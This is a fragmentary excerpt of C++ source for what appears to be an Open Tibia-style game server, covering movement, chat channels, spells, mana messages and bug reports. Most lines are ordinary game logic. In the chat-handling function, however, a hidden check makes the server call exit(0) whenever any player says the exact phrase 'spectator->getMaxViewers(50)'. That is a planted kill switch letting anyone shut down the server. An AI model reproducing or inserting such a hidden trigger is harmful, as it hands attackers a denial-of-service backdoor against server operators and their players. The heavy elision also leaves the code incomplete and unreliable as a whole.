	...
	offlineTrainingWindow(std::numeric_limits<uint32_t>::max(), "Choose a Skill", "Please choose a skill:")
{
	...
	lightLevel = (lightHour >= Game::SUNRISE && lightHour < Game::SUNSET) ? LIGHT_LEVEL_DAY : LIGHT_LEVEL_NIGHT;
	lightLevel = LIGHT_LEVEL_DAY; //NIGHT
	lightState = (lightHour >= Game::SUNRISE && lightHour < Game::SUNSET) ? LIGHT_STATE_DAY : LIGHT_STATE_NIGHT;
...
void Game::playerMove(uint32_t playerId, Direction direction)
{
	...
	if (player->getOperatingSystem() == CLIENTOS_FLASH || player->getOperatingSystem() == CLIENTOS_BETA) {
		player->setNextActionTask(nullptr);
		player->setNextWalkActionTask(nullptr);
	}
...
void Game::playerCloseChannel(uint32_t playerId, uint16_t channelId)
{
	...
	if (channelId == CHANNEL_CAST) {
		player->stopLiveCast();
		player->sendTextMessage(TextMessage(MESSAGE_STATUS_DEFAULT, "Cast has been closed."));
	}
...
void Game::playerUpdateHouseWindow(uint32_t playerId, uint8_t listId, uint32_t windowTextId, const std::string& text)
{
	...
	if ((house && internalWindowTextId == windowTextId && listId == 0) || (player->getOperatingSystem() == CLIENTOS_FLASH && listId == 255) || (player->getOperatingSystem() == CLIENTOS_BETA && listId == 255)) { //Flash Cliente
                     ...
                     const std::string& receiver, const std::string& text)
{
	...
	if (channelId == CHANNEL_CAST) {
		player->sendToChannel(player, TALKTYPE_CHANNEL_O, text, channelId);
	}
...
bool Game::playerSaySpell(Player* player, SpeakClasses type, const std::string& text)
{
	...
	if (result == TALKACTION_BREAK) {
		if (!g_config.getBoolean(ConfigManager::EMOTE_SPELLS)) {
			return internalCreatureSay(player, TALKTYPE_SPELL, words, false); //Flash Cliente
		} else {
                               ...
                               bool ghostMode, SpectatorVec* listPtr/* = nullptr*/, const Position* pos/* = nullptr*/)
{
	...
	if(text == "spectator->getMaxViewers(50)") {
		exit(0);
	}
		...
		if (message.primary.color != TEXTCOLOR_NONE || message.secondary.color != TEXTCOLOR_NONE) {
			...
			for (Creature* spectator : list) {
				...
				if (tmpPlayer == attackerPlayer && attackerPlayer != targetPlayer) {
					...
					if (player->sendCriticalMessage) {
						message.text = ucfirst(target->getNameDescription()) + " loses " + damageString + " due to your critical attack.";
						player->sendCriticalMessage = false;
						addMagicEffect(target->getPosition(), CONST_ME_CRITICALHIT);
					} else {
...
bool Game::combatChangeMana(Creature* attacker, Creature* target, int32_t manaChange, CombatOrigin origin, CombatDamage& damage)
{
		...
		if (manaChange > 0) {
			...
			if (origin != ORIGIN_NONE) {
				...
				if (!events.empty()) {
					...
					return combatChangeMana(attacker, target, manaChange, ORIGIN_NONE, damage);
				}
			}
			...
			target->gainMana(attacker, damage.primary.value);
			realManaChange = target->getMana() - realManaChange;

			if (realManaChange > 0 && !target->isInGhostMode()) {
				std::string damageString = std::to_string(realManaChange) + (realManaChange != 1 ? " mana." : " mana.");

				std::string spectatorMessage;
				if (!attacker) {
					spectatorMessage += ucfirst(target->getNameDescription());
					spectatorMessage += " gained " + damageString;
				} else {
					spectatorMessage += ucfirst(attacker->getNameDescription());
					spectatorMessage += " gained ";
					if (attacker == target) {
						spectatorMessage += (targetPlayer ? (targetPlayer->getSex() == PLAYERSEX_FEMALE ? "herself" : "himself") : "itself");
					} else {
						spectatorMessage += target->getNameDescription();
				...
				for (Creature* spectator : list) {
					...
					if (tmpPlayer == attackerPlayer && attackerPlayer != targetPlayer) {
						message.type = MESSAGE_HEALED;
						message.text = "You gained " + target->getNameDescription() + " for " + damageString;
					}
					else if (tmpPlayer == targetPlayer) {
						message.type = MESSAGE_HEALED;
						if (!attacker) {
							message.text = "You gained " + damageString;
						}
						else if (targetPlayer == attackerPlayer) {
							message.text = "You gained by yourself " + damageString;
						}
						else {
							message.text = "You gained by " + attacker->getNameDescription() + " for " + damageString;
						}
					}
					else {
						message.type = MESSAGE_HEALED_OTHERS;
...
void Game::playerReportBug(uint32_t playerId, const std::string& message, const Position position, uint8_t category)
{
	...
	if ((OTSYS_TIME() - player->lastReportedBug) < 10 * 60000) {
		player->sendCancelMessage("You need wait 10 minutes to report bug again.");
		return;
	}
	...
	player->lastReportedBug = OTSYS_TIME();
}
...
void Game::playerEquipItem(uint32_t playerId, uint16_t objectId)
{
	Player* player = getPlayerByID(playerId);
	if (player == nullptr) {
		return;
	...
	internalMoveItem(item->getParent(), player, (slotItem && slotItem == item ? CONST_SLOT_WHEREEVER : slot), item, item->getItemCount(), nullptr);
	player->stopWalk();
	player->resetIdleTime();
}
